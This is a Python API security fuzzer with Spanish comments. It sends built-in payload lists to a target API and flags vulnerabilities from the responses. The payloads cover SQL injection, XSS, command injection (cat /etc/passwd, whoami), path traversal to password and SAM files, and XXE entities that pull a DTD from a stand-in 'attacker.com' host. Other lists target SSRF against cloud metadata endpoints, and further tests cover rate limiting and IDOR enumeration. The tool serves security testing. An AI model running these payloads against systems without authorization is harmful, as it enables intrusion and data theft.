#!/usr/bin/env python3
"""
API Fuzzer 
BY. Cinn4mor0ll
"""

import requests
import json
import time
import argparse
import urllib.parse
import logging
import sys
import re
import threading
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from enum import Enum
from datetime import datetime
import concurrent.futures
from urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init
import hashlib
import base64


requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

init(autoreset=True)

class VulnerabilityType(Enum):
    """Tipos de vulnerabilidades detectadas"""
    SQL_INJECTION = "SQL Injection"
    XSS = "Cross-Site Scripting"
    COMMAND_INJECTION = "Command Injection"
    PATH_TRAVERSAL = "Path Traversal"
    XXE = "XML External Entity"
    SSRF = "Server-Side Request Forgery"
    AUTH_BYPASS = "Authentication Bypass"
    IDOR = "Insecure Direct Object Reference"
    RATE_LIMIT = "Rate Limiting Issue"
    INFO_DISCLOSURE = "Information Disclosure"
    BROKEN_AUTH = "Broken Authentication"
    SECURITY_MISCONFIG = "Security Misconfiguration"
    SENSITIVE_DATA = "Sensitive Data Exposure"

class SeverityLevel(Enum):
    """Niveles de severidad según CVSS"""
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"
    INFO = "Informational"

@dataclass
class FuzzResult:
    """Resultado detallado de un test de fuzzing"""
    endpoint: str
    method: str
    payload: str
    status_code: int
    response_time: float
    response_length: int
    vulnerability_type: VulnerabilityType = None
    severity: SeverityLevel = SeverityLevel.INFO
    is_vulnerable: bool = False
    details: str = ""
    response_headers: Dict[str, str] = None
    request_id: str = ""
    timestamp: str = ""
    
    def to_dict(self):
        """Convierte el resultado a diccionario para JSON"""
        data = asdict(self)
        data['vulnerability_type'] = self.vulnerability_type.value if self.vulnerability_type else None
        data['severity'] = self.severity.value
        return data

class PayloadGenerator:
    """Generador de payloads"""
    
    @staticmethod
    def sql_injection_payloads() -> List[Dict[str, Any]]:
        """Payloads para SQL Injection con metadatos"""
        return [
            {"payload": "' OR '1'='1", "type": "boolean_based", "dbms": "generic"},
            {"payload": "' OR '1'='1' --", "type": "boolean_based", "dbms": "mysql"},
            {"payload": "' OR '1'='1' /*", "type": "boolean_based", "dbms": "mysql"},
            {"payload": "admin' --", "type": "comment_based", "dbms": "generic"},
            {"payload": "admin' #", "type": "comment_based", "dbms": "mysql"},
            {"payload": "' or 1=1--", "type": "boolean_based", "dbms": "generic"},
            {"payload": "') or '1'='1--", "type": "boolean_based", "dbms": "generic"},
            {"payload": "1' ORDER BY 1--+", "type": "error_based", "dbms": "generic"},
            {"payload": "1' ORDER BY 10--+", "type": "error_based", "dbms": "generic"},
            {"payload": "1' UNION SELECT NULL--", "type": "union_based", "dbms": "generic"},
            {"payload": "1' UNION SELECT NULL,NULL--", "type": "union_based", "dbms": "generic"},
            {"payload": "' UNION SELECT NULL,NULL,NULL--", "type": "union_based", "dbms": "generic"},
            {"payload": "1'; WAITFOR DELAY '00:00:05'--", "type": "time_based", "dbms": "mssql"},
            {"payload": "1' AND SLEEP(5)--", "type": "time_based", "dbms": "mysql"},
            {"payload": "1' AND pg_sleep(5)--", "type": "time_based", "dbms": "postgresql"},
            {"payload": "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "type": "time_based", "dbms": "oracle"},
            {"payload": "1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", "type": "time_based", "dbms": "postgresql"},
            {"payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "type": "time_based", "dbms": "mysql"},
            {"payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "type": "error_based", "dbms": "mysql"},
            {"payload": "1' AND 1=CONVERT(int,@@version)--", "type": "error_based", "dbms": "mssql"},
        ]
    
    @staticmethod
    def xss_payloads() -> List[Dict[str, Any]]:
        """Payloads para XSS con contexto"""
        return [
            {"payload": "<script>alert('XSS')</script>", "context": "html", "type": "reflected"},
            {"payload": "<img src=x onerror=alert('XSS')>", "context": "html", "type": "reflected"},
            {"payload": "<svg/onload=alert('XSS')>", "context": "html", "type": "reflected"},
            {"payload": "<iframe src=javascript:alert('XSS')>", "context": "html", "type": "reflected"},
            {"payload": "<body onload=alert('XSS')>", "context": "html", "type": "reflected"},
            {"payload": "javascript:alert('XSS')", "context": "attribute", "type": "reflected"},
            {"payload": "\"><script>alert('XSS')</script>", "context": "attribute", "type": "reflected"},
            {"payload": "'><script>alert(String.fromCharCode(88,83,83))</script>", "context": "attribute", "type": "reflected"},
            {"payload": "<svg><script>alert&#40;'XSS'&#41;</script>", "context": "html", "type": "reflected"},
            {"payload": "<img src=x:alert(alt) onerror=eval(src) alt=xss>", "context": "html", "type": "reflected"},
            {"payload": "'-alert(1)-'", "context": "javascript", "type": "reflected"},
            {"payload": "';alert(String.fromCharCode(88,83,83))//", "context": "javascript", "type": "reflected"},
            {"payload": "<marquee onstart=alert('XSS')>", "context": "html", "type": "reflected"},
            {"payload": "<details open ontoggle=alert('XSS')>", "context": "html", "type": "reflected"},
        ]
    
    @staticmethod
    def command_injection_payloads() -> List[Dict[str, Any]]:
        """Payloads para Command Injection"""
        return [
            {"payload": "; ls -la", "os": "linux", "separator": ";"},
            {"payload": "| ls -la", "os": "linux", "separator": "|"},
            {"payload": "|| ls -la", "os": "linux", "separator": "||"},
            {"payload": "& dir", "os": "windows", "separator": "&"},
            {"payload": "&& dir", "os": "windows", "separator": "&&"},
            {"payload": "; cat /etc/passwd", "os": "linux", "separator": ";"},
            {"payload": "| cat /etc/passwd", "os": "linux", "separator": "|"},
            {"payload": "; ping -c 3 127.0.0.1", "os": "linux", "separator": ";"},
            {"payload": "| ping -c 3 127.0.0.1", "os": "linux", "separator": "|"},
            {"payload": "`ls -la`", "os": "linux", "separator": "backtick"},
            {"payload": "$(ls -la)", "os": "linux", "separator": "$()"},
            {"payload": "; sleep 5", "os": "linux", "separator": ";"},
            {"payload": "| sleep 5", "os": "linux", "separator": "|"},
            {"payload": "; whoami", "os": "linux", "separator": ";"},
            {"payload": "& whoami", "os": "windows", "separator": "&"},
            {"payload": "%0a ls -la", "os": "linux", "separator": "newline"},
            {"payload": "%0d%0a dir", "os": "windows", "separator": "crlf"},
        ]
    
    @staticmethod
    def path_traversal_payloads() -> List[Dict[str, Any]]:
        """Payloads para Path Traversal"""
        return [
            {"payload": "../../../etc/passwd", "encoding": "none", "os": "linux"},
            {"payload": "..\\..\\..\\windows\\system32\\config\\sam", "encoding": "none", "os": "windows"},
            {"payload": "....//....//....//etc/passwd", "encoding": "none", "os": "linux"},
            {"payload": "..%2f..%2f..%2fetc%2fpasswd", "encoding": "url", "os": "linux"},
            {"payload": "..%252f..%252f..%252fetc%252fpasswd", "encoding": "double_url", "os": "linux"},
            {"payload": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "encoding": "utf8", "os": "linux"},
            {"payload": "/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "encoding": "url", "os": "linux"},
            {"payload": "/var/www/../../etc/passwd", "encoding": "none", "os": "linux"},
            {"payload": "....\\\\....\\\\....\\\\windows\\system32\\config\\sam", "encoding": "none", "os": "windows"},
        ]
    
    @staticmethod
    def xxe_payloads() -> List[Dict[str, Any]]:
        """Payloads para XXE"""
        return [
            {
                "payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                "type": "file_disclosure",
                "target": "/etc/passwd"
            },
            {
                "payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
                "type": "file_disclosure",
                "target": "win.ini"
            },
            {
                "payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://attacker.com/evil.dtd">]><root>&test;</root>',
                "type": "ssrf",
                "target": "external"
            },
            {
                "payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><root>&xxe;</root>',
                "type": "out_of_band",
                "target": "external"
            },
        ]
    
    @staticmethod
    def ssrf_payloads() -> List[Dict[str, Any]]:
        """Payloads para SSRF"""
        return [
            {"payload": "http://localhost", "target": "localhost", "type": "basic"},
            {"payload": "http://127.0.0.1", "target": "localhost", "type": "basic"},
            {"payload": "http://0.0.0.0", "target": "localhost", "type": "basic"},
            {"payload": "http://169.254.169.254/latest/meta-data/", "target": "aws_metadata", "type": "cloud"},
            {"payload": "http://metadata.google.internal/computeMetadata/v1/", "target": "gcp_metadata", "type": "cloud"},
            {"payload": "http://[::1]", "target": "localhost_ipv6", "type": "basic"},
            {"payload": "http://2130706433", "target": "localhost_decimal", "type": "obfuscation"},
            {"payload": "http://0x7f000001", "target": "localhost_hex", "type": "obfuscation"},
            {"payload": "file:///etc/passwd", "target": "file_system", "type": "file"},
            {"payload": "http://169.254.169.254/latest/user-data/", "target": "aws_userdata", "type": "cloud"},
        ]

class SecurityHeaders:
    """Verificador de headers de seguridad"""
    
    REQUIRED_HEADERS = {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=',
        'Content-Security-Policy': None,
    }
    
    SENSITIVE_HEADERS = [
        'Server', 'X-Powered-By', 'X-AspNet-Version', 
        'X-AspNetMvc-Version', 'X-Runtime'
    ]
    
    @classmethod
    def analyze(cls, headers: Dict[str, str]) -> List[str]:
        """Analiza los headers de seguridad"""
        issues = []
        
        # Headers faltantes
        for header, expected_value in cls.REQUIRED_HEADERS.items():
            if header not in headers:
                issues.append(f"Header de seguridad faltante: {header}")
            elif expected_value:
                if isinstance(expected_value, list):
                    if not any(val in headers[header] for val in expected_value):
                        issues.append(f"Valor incorrecto en {header}: {headers[header]}")
                elif expected_value not in headers[header]:
                    issues.append(f"Valor incorrecto en {header}: {headers[header]}")
        
        # Headers que exponen información sensible
        for header in cls.SENSITIVE_HEADERS:
            if header in headers:
                issues.append(f"Header sensible expuesto: {header}: {headers[header]}")
        
        return issues

class APIFuzzer:
    """Fuzzer para APIs"""
    
    def __init__(self, base_url: str, headers: Dict[str, str] = None,
                 timeout: int = 10, threads: int = 5, verbose: bool = False,
                 verify_ssl: bool = True, proxy: str = None, delay: float = 0.1):
        self.base_url = base_url.rstrip('/')
        self.headers = headers or {
            "User-Agent": "Mozilla/5.0 (compatible; APIFuzzer/2.0; +https://secureaegis.net)"
        }
        self.timeout = timeout
        self.threads = threads
        self.verbose = verbose
        self.verify_ssl = verify_ssl
        self.delay = delay
        self.results: List[FuzzResult] = []
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        
        # Configurar proxy 
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
        
        # Configurar logging
        self.setup_logging()
        
        # Lock para thread-safety
        self.results_lock = threading.Lock()
        
    def setup_logging(self):
        """Configura el sistema de logging"""
        log_format = '%(asctime)s - %(levelname)s - %(message)s'
        logging.basicConfig(
            level=logging.DEBUG if self.verbose else logging.INFO,
            format=log_format,
            handlers=[
                logging.FileHandler(f'fuzzer_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def print_banner(self):
        """Banner"""
        banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════════╗
║                           API Fuzzer                          ║
║                         By Cinn4mor0ll                        ║
╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

        """
        print(banner)
    
    def log(self, message: str, level: str = "INFO"):
        """Sistema de logging"""
        colors = {
            "INFO": Fore.CYAN,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "VULN": Fore.RED + Style.BRIGHT,
            "CRITICAL": Fore.MAGENTA + Style.BRIGHT
        }
        color = colors.get(level, Fore.WHITE)
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted_message = f"{color}[{timestamp}] [{level}] {message}{Style.RESET_ALL}"
        print(formatted_message)
        
        # log a archivo
        if level == "ERROR":
            self.logger.error(message)
        elif level in ["VULN", "CRITICAL"]:
            self.logger.critical(message)
        elif level == "WARNING":
            self.logger.warning(message)
        else:
            self.logger.info(message)
    
    def make_request(self, endpoint: str, method: str = "GET",
                     data: Any = None, params: Dict = None,
                     additional_headers: Dict = None) -> Optional[requests.Response]:
        """Realiza petición HTTP con manejo de errores"""
        url = f"{self.base_url}{endpoint}"
        
        # Merge headers 
        request_headers = self.headers.copy()
        if additional_headers:
            request_headers.update(additional_headers)
        
        try:
            if method.upper() == "GET":
                response = self.session.get(
                    url, params=params, timeout=self.timeout,
                    verify=self.verify_ssl, headers=request_headers
                )
            elif method.upper() == "POST":
                response = self.session.post(
                    url, json=data, params=params, timeout=self.timeout,
                    verify=self.verify_ssl, headers=request_headers
                )
            elif method.upper() == "PUT":
                response = self.session.put(
                    url, json=data, params=params, timeout=self.timeout,
                    verify=self.verify_ssl, headers=request_headers
                )
            elif method.upper() == "DELETE":
                response = self.session.delete(
                    url, params=params, timeout=self.timeout,
                    verify=self.verify_ssl, headers=request_headers
                )
            elif method.upper() == "PATCH":
                response = self.session.patch(
                    url, json=data, params=params, timeout=self.timeout,
                    verify=self.verify_ssl, headers=request_headers
                )
            elif method.upper() == "OPTIONS":
                response = self.session.options(
                    url, timeout=self.timeout,
                    verify=self.verify_ssl, headers=request_headers
                )
            else:
                self.log(f"Método HTTP no soportado: {method}", "ERROR")
                return None
                
            return response
            
        except requests.exceptions.SSLError as e:
            self.log(f"Error SSL: {str(e)}", "ERROR")
            return None
        except requests.exceptions.Timeout:
            self.log(f"Timeout alcanzado para {url}", "WARNING")
            return None
        except requests.exceptions.ConnectionError as e:
            self.log(f"Error de conexión: {str(e)}", "ERROR")
            return None
        except requests.exceptions.RequestException as e:
            self.log(f"Error en request: {str(e)}", "ERROR")
            return None
    
    def analyze_response(self, response: requests.Response, payload: Any,
                        vuln_type: VulnerabilityType) -> Optional[FuzzResult]:
        """Análisis avanzado de respuestas"""
        if response is None:
            return None
        
        is_vulnerable = False
        details = ""
        severity = SeverityLevel.INFO
        
        response_text = response.text.lower()
        response_headers = dict(response.headers)
        
        # Análisis por tipo de vulnerabilidad
        if vuln_type == VulnerabilityType.SQL_INJECTION:
            sql_errors = [
                ("sql syntax", "MySQL/Generic"),
                ("mysql", "MySQL"),
                ("postgresql", "PostgreSQL"),
                ("ora-", "Oracle"),
                ("sqlite", "SQLite"),
                ("syntax error", "Generic"),
                ("database error", "Generic"),
                ("warning: mysql", "MySQL"),
                ("unclosed quotation", "Generic"),
                ("quoted string not properly terminated", "Generic"),
                ("microsoft ole db provider for sql server", "MSSQL"),
                ("odbc sql server driver", "MSSQL"),
                ("pg_query()", "PostgreSQL"),
                ("supplied argument is not a valid mysql", "MySQL"),
                ("column count doesn't match", "MySQL"),
                ("the used select statements have different number of columns", "MySQL"),
            ]
            
            for error, dbms in sql_errors:
                if error in response_text:
                    is_vulnerable = True
                    severity = SeverityLevel.HIGH
                    details = f"SQL Injection detectado - DBMS: {dbms} - Error: '{error}'"
                    break
            
            # Detección basada en tiempo
            if isinstance(payload, dict) and payload.get('type') == 'time_based':
                if response.elapsed.total_seconds() >= 5:
                    is_vulnerable = True
                    severity = SeverityLevel.HIGH
                    details = f"Time-based SQL Injection detectado - Delay: {response.elapsed.total_seconds():.2f}s"
        
        elif vuln_type == VulnerabilityType.XSS:
            # Verificar si el payload se refleja sin encoding
            if isinstance(payload, dict):
                payload_str = payload['payload']
            else:
                payload_str = str(payload)
            
            # Buscar el payload exacto o variantes
            if payload_str in response.text:
                is_vulnerable = True
                severity = SeverityLevel.MEDIUM
                details = "XSS Reflejado detectado - Payload sin sanitizar"
            
            # Verificar encoding inadecuado
            elif re.search(r'<script[^>]*>.*?</script>', response.text, re.IGNORECASE):
                if any(tag in payload_str.lower() for tag in ['<script', '<img', '<svg', '<iframe']):
                    is_vulnerable = True
                    severity = SeverityLevel.MEDIUM
                    details = "Posible XSS - Tags HTML presentes en respuesta"
        
        elif vuln_type == VulnerabilityType.COMMAND_INJECTION:
            command_indicators = [
                ("root:", "Usuario root en output"),
                ("bin:", "Directorio bin en output"),
                ("daemon:", "Usuario daemon en output"),
                ("total ", "Output de comando ls"),
                ("drwx", "Permisos de archivos"),
                ("uid=", "Output de comando id"),
                ("gid=", "Output de comando id"),
                ("volume serial number", "Output de comando dir (Windows)"),
            ]
            
            for indicator, description in command_indicators:
                if indicator in response_text:
                    is_vulnerable = True
                    severity = SeverityLevel.CRITICAL
                    details = f"Command Injection detectado - {description}"
                    break
            
            # Detección basada en tiempo para sleep/ping
            if response.elapsed.total_seconds() >= 5:
                if isinstance(payload, dict) and 'sleep' in payload.get('payload', '').lower():
                    is_vulnerable = True
                    severity = SeverityLevel.CRITICAL
                    details = f"Time-based Command Injection - Delay: {response.elapsed.total_seconds():.2f}s"
        
        elif vuln_type == VulnerabilityType.PATH_TRAVERSAL:
            path_indicators = [
                ("root:x:", "/etc/passwd completo"),
                ("[extensions]", "win.ini"),
                ("[fonts]", "win.ini"),
                ("bin:x:", "/etc/passwd parcial"),
                ("[boot loader]", "boot.ini"),
                ("system32", "Ruta Windows"),
            ]
            
            for indicator, description in path_indicators:
                if indicator in response_text:
                    is_vulnerable = True
                    severity = SeverityLevel.HIGH
                    details = f"Path Traversal detectado - {description}"
                    break
        
        elif vuln_type == VulnerabilityType.XXE:
            xxe_indicators = [
                "root:x:", "bin:x:", "daemon:", 
                "[extensions]", "[fonts]",
                "<!doctype", "<!entity"
            ]
            
            for indicator in xxe_indicators:
                if indicator in response_text:
                    is_vulnerable = True
                    severity = SeverityLevel.HIGH
                    details = f"XXE detectado - Indicador: '{indicator}'"
                    break
        
        elif vuln_type == VulnerabilityType.SSRF:
            ssrf_indicators = [
                "ami-id", "instance-id", "local-hostname",  # AWS metadata
                "computemetadata",  # GCP metadata
                "root:x:", "bin:x:",  # File system access
            ]
            
            for indicator in ssrf_indicators:
                if indicator in response_text:
                    is_vulnerable = True
                    severity = SeverityLevel.HIGH
                    details = f"SSRF detectado - Indicador: '{indicator}'"
                    break
        
        elif vuln_type == VulnerabilityType.INFO_DISCLOSURE:
            # Analizar headers de seguridad
            security_issues = SecurityHeaders.analyze(response_headers)
            if security_issues:
                is_vulnerable = True
                severity = SeverityLevel.LOW
                details = " | ".join(security_issues)
        
        # Análisis general de errores del servidor
        if response.status_code == 500:
            is_vulnerable = True
            severity = SeverityLevel.MEDIUM
            details += " | Error 500 - Posible procesamiento incorrecto del input"
        elif response.status_code == 403:
            details += " | Status 403 - Acceso denegado"
        elif response.status_code == 401:
            details += " | Status 401 - No autorizado"
        
        # Crear resultado
        payload_str = payload['payload'] if isinstance(payload, dict) else str(payload)
        
        result = FuzzResult(
            endpoint=response.url,
            method=response.request.method,
            payload=payload_str[:200],  # Limitar tamaño
            status_code=response.status_code,
            response_time=response.elapsed.total_seconds(),
            response_length=len(response.content),
            vulnerability_type=vuln_type,
            severity=severity,
            is_vulnerable=is_vulnerable,
            details=details.strip(),
            response_headers=response_headers,
            request_id=hashlib.md5(f"{response.url}{payload_str}".encode()).hexdigest()[:8],
            timestamp=datetime.now().isoformat()
        )
        
        return result
    
    def fuzz_endpoint(self, endpoint: str, method: str = "GET",
                     param_name: str = "id", vuln_type: VulnerabilityType = None):
        """Fuzzing de endpoint con payloads específicos"""
        self.log(f"Fuzzing: {endpoint} [{method}] - Tipo: {vuln_type.value}")
        
        # Seleccionar payloads
        payload_map = {
            VulnerabilityType.SQL_INJECTION: PayloadGenerator.sql_injection_payloads(),
            VulnerabilityType.XSS: PayloadGenerator.xss_payloads(),
            VulnerabilityType.COMMAND_INJECTION: PayloadGenerator.command_injection_payloads(),
            VulnerabilityType.PATH_TRAVERSAL: PayloadGenerator.path_traversal_payloads(),
            VulnerabilityType.XXE: PayloadGenerator.xxe_payloads(),
            VulnerabilityType.SSRF: PayloadGenerator.ssrf_payloads(),
        }
        
        payloads = payload_map.get(vuln_type, [])
        total_payloads = len(payloads)
        
        for idx, payload_data in enumerate(payloads, 1):
            if self.verbose:
                self.log(f"Progress: {idx}/{total_payloads} payloads", "INFO")
            
            # Extraer payload
            if isinstance(payload_data, dict):
                payload = payload_data['payload']
            else:
                payload = payload_data
            
            # Hacer request
            params = {param_name: payload}
            
            # Para XXE, enviar como XML en body
            if vuln_type == VulnerabilityType.XXE:
                additional_headers = {"Content-Type": "application/xml"}
                response = self.make_request(
                    endpoint, method="POST",
                    data=payload, additional_headers=additional_headers
                )
            else:
                response = self.make_request(endpoint, method, params=params)
            
            if response:
                result = self.analyze_response(response, payload_data, vuln_type)
                if result:
                    with self.results_lock:
                        self.results.append(result)
                    
                    if result.is_vulnerable:
                        self.log(
                            f"[{result.severity.value}] {vuln_type.value} en {endpoint}",
                            "VULN"
                        )
                        self.log(f"Payload: {payload[:100]}", "VULN")
                        self.log(f"Detalles: {result.details}", "VULN")
            
            # Rate limiting
            time.sleep(self.delay)
    
    def test_security_headers(self, endpoint: str):
        """Analiza los headers de seguridad"""
        self.log(f"Analizando security headers en {endpoint}")
        
        response = self.make_request(endpoint, method="OPTIONS")
        if not response:
            response = self.make_request(endpoint, method="GET")
        
        if response:
            result = self.analyze_response(
                response, "Security Headers Analysis",
                VulnerabilityType.INFO_DISCLOSURE
            )
            if result:
                with self.results_lock:
                    self.results.append(result)
    
    def test_rate_limiting(self, endpoint: str, requests_count: int = 100):
        """Test de rate limiting mejorado"""
        self.log(f"Testeando Rate Limiting: {endpoint} ({requests_count} requests)")
        
        start_time = time.time()
        status_codes = []
        
        for i in range(requests_count):
            response = self.make_request(endpoint)
            if response:
                status_codes.append(response.status_code)
                
                if response.status_code == 429:
                    self.log(f"Rate limit alcanzado en request #{i+1}", "SUCCESS")
                    return
                
                if self.verbose and i % 10 == 0:
                    self.log(f"Progress: {i}/{requests_count} requests", "INFO")
        
        elapsed_time = time.time() - start_time
        successful = status_codes.count(200)
        
        if 429 not in status_codes:
            self.log(
                f"[CRÍTICO] Sin rate limiting: {successful} requests exitosos en {elapsed_time:.2f}s",
                "CRITICAL"
            )
            
            result = FuzzResult(
                endpoint=endpoint,
                method="GET",
                payload=f"{requests_count} requests consecutivos",
                status_code=200,
                response_time=elapsed_time,
                response_length=0,
                vulnerability_type=VulnerabilityType.RATE_LIMIT,
                severity=SeverityLevel.MEDIUM,
                is_vulnerable=True,
                details=f"Sin rate limiting - {successful}/{requests_count} exitosos - {successful/elapsed_time:.2f} req/s",
                timestamp=datetime.now().isoformat()
            )
            
            with self.results_lock:
                self.results.append(result)
    
    def test_idor(self, endpoint: str, id_range: range = range(1, 100)):
        """Test de IDOR"""
        self.log(f"Testeando IDOR en {endpoint}")
        
        accessible_ids = []
        status_distribution = {}
        
        for obj_id in id_range:
            test_endpoint = f"{endpoint}/{obj_id}"
            response = self.make_request(test_endpoint)
            
            if response:
                status_code = response.status_code
                status_distribution[status_code] = status_distribution.get(status_code, 0) + 1
                
                if status_code == 200:
                    accessible_ids.append(obj_id)
                    if self.verbose:
                        self.log(f"ID {obj_id} accesible (200 OK)", "WARNING")
            
            time.sleep(self.delay)
        
        # Análisis de resultados
        total_tested = len(id_range)
        accessible_percent = (len(accessible_ids) / total_tested) * 100
        
        if accessible_percent > 80:
            severity = SeverityLevel.HIGH
            is_vuln = True
            details = f"IDOR Crítico: {len(accessible_ids)}/{total_tested} IDs accesibles ({accessible_percent:.1f}%)"
        elif accessible_percent > 50:
            severity = SeverityLevel.MEDIUM
            is_vuln = True
            details = f"Posible IDOR: {len(accessible_ids)}/{total_tested} IDs accesibles ({accessible_percent:.1f}%)"
        else:
            severity = SeverityLevel.LOW
            is_vuln = False
            details = f"Control de acceso presente: {len(accessible_ids)}/{total_tested} IDs accesibles ({accessible_percent:.1f}%)"
        
        self.log(details, "VULN" if is_vuln else "SUCCESS")
        
        result = FuzzResult(
            endpoint=endpoint,
            method="GET",
            payload=f"IDs {id_range.start}-{id_range.stop-1}",
            status_code=200,
            response_time=0,
            response_length=0,
            vulnerability_type=VulnerabilityType.IDOR,
            severity=severity,
            is_vulnerable=is_vuln,
            details=details + f" | Distribución: {status_distribution}",
            timestamp=datetime.now().isoformat()
        )
        
        with self.results_lock:
            self.results.append(result)
    
    def generate_report(self, output_file: str = None, json_output: str = None):
        """Genera reporte profesional"""
        self.log("Generando reporte de auditoría...")
        
        vulnerabilities = [r for r in self.results if r.is_vulnerable]
        
        # Agrupar por severidad
        by_severity = {
            SeverityLevel.CRITICAL: [],
            SeverityLevel.HIGH: [],
            SeverityLevel.MEDIUM: [],
            SeverityLevel.LOW: [],
        }
        
        for vuln in vulnerabilities:
            if vuln.severity in by_severity:
                by_severity[vuln.severity].append(vuln)
        
        # Generar reporte en texto
        report = f"""
{'='*80}
                    REPORTE GENERADO
{'='*80}

INFORMACIÓN GENERAL
{'='*80}
Fecha/Hora:          {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Target:              {self.base_url}
Total Tests:         {len(self.results)}
Vulnerabilidades:    {len(vulnerabilities)}
SSL Verification:    {'Enabled' if self.verify_ssl else 'Disabled'}

RESUMEN POR SEVERIDAD
{'='*80}
Critical:            {len(by_severity[SeverityLevel.CRITICAL])}
High:                {len(by_severity[SeverityLevel.HIGH])}
Medium:              {len(by_severity[SeverityLevel.MEDIUM])}
Low:                 {len(by_severity[SeverityLevel.LOW])}

"""
        
        if vulnerabilities:
            report += f"\n{'='*80}\n"
            report += "VULNERABILIDADES DETECTADAS\n"
            report += f"{'='*80}\n\n"
            
            for severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH, 
                           SeverityLevel.MEDIUM, SeverityLevel.LOW]:
                vulns = by_severity[severity]
                if vulns:
                    report += f"\n[{severity.value.upper()}] - {len(vulns)} Hallazgos\n"
                    report += f"{'-'*80}\n"
                    
                    for idx, vuln in enumerate(vulns, 1):
                        report += f"""
#{idx} - {vuln.vulnerability_type.value}
Endpoint:        {vuln.endpoint}
Método:          {vuln.method}
Severidad:       {vuln.severity.value}
Status Code:     {vuln.status_code}
Response Time:   {vuln.response_time:.3f}s
Payload:         {vuln.payload[:150]}{'...' if len(vuln.payload) > 150 else ''}
Detalles:        {vuln.details}
Request ID:      {vuln.request_id}
Timestamp:       {vuln.timestamp}
{'-'*80}
"""
        else:
            report += "\n✓ No se detectaron vulnerabilidades evidentes.\n"
        
        
        report += f"{'='*80}\n"
        report += f"Reporte generado - Cinn4mor0ll\n"
        report += f"{'='*80}\n"
        
        # Imprimir reporte
        print(report)
        
        # Guardar reporte en archivo
        if output_file:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(report)
            self.log(f"Reporte guardado: {output_file}", "SUCCESS")
        
        # Guardar en JSON
        if json_output:
            json_data = {
                "scan_info": {
                    "timestamp": datetime.now().isoformat(),
                    "target": self.base_url,
                    "total_tests": len(self.results),
                    "vulnerabilities_found": len(vulnerabilities)
                },
                "summary": {
                    "critical": len(by_severity[SeverityLevel.CRITICAL]),
                    "high": len(by_severity[SeverityLevel.HIGH]),
                    "medium": len(by_severity[SeverityLevel.MEDIUM]),
                    "low": len(by_severity[SeverityLevel.LOW])
                },
                "vulnerabilities": [v.to_dict() for v in vulnerabilities]
            }
            
            with open(json_output, 'w', encoding='utf-8') as f:
                json.dump(json_data, f, indent=2, ensure_ascii=False)
            self.log(f"JSON guardado: {json_output}", "SUCCESS")

def main():
    parser = argparse.ArgumentParser(
        description='API Security Fuzzer Pro v2.0 - SecureAegis',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  %(prog)s -u https://api.example.com -e /api/users --type all
  %(prog)s -u https://api.example.com -e /api/search --type sql -p query -v
  %(prog)s -u https://api.example.com -e /api/data --type rate --requests 200
  %(prog)s -u https://api.example.com -e /api/users --type idor --id-range 1-500
  %(prog)s -u https://api.example.com -e /api/login --headers "Authorization: Bearer TOKEN"
        """
    )
    
    # Argumentos principales
    parser.add_argument('-u', '--url', required=True, help='URL base de la API')
    parser.add_argument('-e', '--endpoint', default='/', help='Endpoint a testear')
    parser.add_argument('-m', '--method', default='GET', 
                       choices=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
                       help='Método HTTP')
    parser.add_argument('-p', '--param', default='id', help='Parámetro a fuzzear')
    
    # Tipos de test
    parser.add_argument('-t', '--type', 
                       choices=['sql', 'xss', 'cmd', 'path', 'xxe', 'ssrf', 
                               'rate', 'idor', 'headers', 'all'],
                       default='all', help='Tipo de test')
    
    # Configuración de output
    parser.add_argument('-o', '--output', help='Archivo de salida (texto)')
    parser.add_argument('-j', '--json', help='Archivo de salida (JSON)')
    
    # Opciones avanzadas
    parser.add_argument('--threads', type=int, default=5, help='Número de threads')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout (segundos)')
    parser.add_argument('--delay', type=float, default=0.1, 
                       help='Delay entre requests (segundos)')
    parser.add_argument('--no-ssl-verify', action='store_true', 
                       help='Deshabilitar verificación SSL')
    parser.add_argument('--proxy', help='Proxy (ej: http://127.0.0.1:8080)')
    parser.add_argument('--headers', help='Headers adicionales (formato: "Key: Value")')
    
    # Opciones específicas de test
    parser.add_argument('--requests', type=int, default=100, 
                       help='Número de requests para rate limiting')
    parser.add_argument('--id-range', default='1-100', 
                       help='Rango de IDs para IDOR (ej: 1-100)')
    
    # Otros
    parser.add_argument('-v', '--verbose', action='store_true', help='Modo verbose')
    parser.add_argument('--version', action='version', version='APIFuzzer Pro 2.0')
    
    args = parser.parse_args()
    
